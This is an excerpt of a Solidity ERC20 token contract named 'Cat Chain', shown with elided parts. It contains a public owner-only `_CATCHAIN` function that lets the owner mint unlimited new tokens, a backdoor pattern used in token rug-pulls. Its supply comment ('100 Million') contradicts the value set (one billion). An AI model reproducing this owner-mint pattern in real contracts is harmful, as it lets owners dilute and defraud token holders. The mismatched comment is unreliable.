...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _CATCHAIN(uint256 amount) public onlyOwner {
 _CATCHAIN(msg.sender, amount);
    }
    ...
    function _CATCHAIN(address account, uint256 amount) internal virtual {
...
contract $CatChain is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Cat Chain", "CATCHAIN") {
     _CATCHAIN(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}